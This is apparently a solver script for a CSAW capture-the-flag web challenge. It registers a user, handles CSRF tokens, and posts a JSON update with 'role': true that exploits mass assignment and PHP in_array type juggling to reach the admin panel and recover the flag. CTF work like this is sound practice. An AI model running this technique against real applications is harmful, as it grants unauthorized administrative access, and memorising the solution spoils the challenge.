#!/usr/bin/env python3
"""Juggler: mass-assign session role=true, then PHP in_array juggling.

Usage:
    python3 solve.py http://10.0.161.60:80
"""
from __future__ import annotations

import http.cookiejar
import json
import os
import re
import sys
import time
import urllib.parse
import urllib.request


def extract_csrf(html: str) -> str:
    m = re.search(r'name=["\']csrf_token["\']\s+value=["\']([a-f0-9]+)["\']', html)
    if not m:
        m = re.search(r'value=["\']([a-f0-9]+)["\']\s+name=["\']csrf_token["\']', html)
    if not m:
        raise ValueError("CSRF token not found")
    return m.group(1)


def extract_flag(html: str) -> str:
    m = re.search(r"csaw\{[^}]+\}", html)
    if m:
        return m.group(0)
    m = re.search(
        r'<section id="admin-panel">\s*<h2>Welcome, Admin</h2>\s*<div>(.*?)</div>',
        html,
        re.DOTALL,
    )
    if not m:
        raise RuntimeError("admin flag section missing")
    return m.group(1).strip()


def solve(base_url: str) -> str:
    base_url = base_url.rstrip("/")
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    def get(path: str) -> str:
        req = urllib.request.Request(base_url + path, headers={"User-Agent": "juggler-solve"})
        with opener.open(req, timeout=15) as resp:
            return resp.read().decode("utf-8", "replace")

    def post_form(path: str, data: dict) -> str:
        req = urllib.request.Request(
            base_url + path,
            data=urllib.parse.urlencode(data).encode(),
            headers={"User-Agent": "juggler-solve"},
            method="POST",
        )
        with opener.open(req, timeout=15) as resp:
            return resp.read().decode("utf-8", "replace")

    csrf = extract_csrf(get("/register.php"))
    uname = f"user_{int(time.time())}"
    pwd = "RemotePassword123!"
    post_form("/register.php", {"username": uname, "password": pwd, "csrf_token": csrf})

    csrf = extract_csrf(get("/login.php"))
    dash = post_form("/login.php", {"username": uname, "password": pwd, "csrf_token": csrf})
    if "Dashboard" not in dash:
        raise RuntimeError("login did not reach dashboard")
    csrf = extract_csrf(dash)

    payload = json.dumps(
        {"username": uname, "password": "", "role": True, "csrf_token": csrf}
    ).encode()
    req = urllib.request.Request(
        base_url + "/dashboard.php",
        data=payload,
        headers={
            "Content-Type": "application/json",
            "User-Agent": "juggler-solve",
        },
        method="POST",
    )
    with opener.open(req, timeout=15) as resp:
        body = json.loads(resp.read().decode())
    if body.get("status") != "success":
        raise RuntimeError(f"profile update failed: {body}")

    admin = get("/admin.php")
    if "Welcome, Admin" not in admin:
        raise RuntimeError("admin panel denied")
    flag = extract_flag(admin)
    art = os.path.join(os.path.dirname(os.path.abspath(__file__)), "artifacts")
    os.makedirs(art, exist_ok=True)
    path = os.path.join(art, "recovered_flag.txt")
    with open(path, "w") as fh:
        fh.write(flag + "\n")
    os.chmod(path, 0o600)
    print(flag)
    return flag


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <base_url>", file=sys.stderr)
        raise SystemExit(1)
    solve(sys.argv[1])
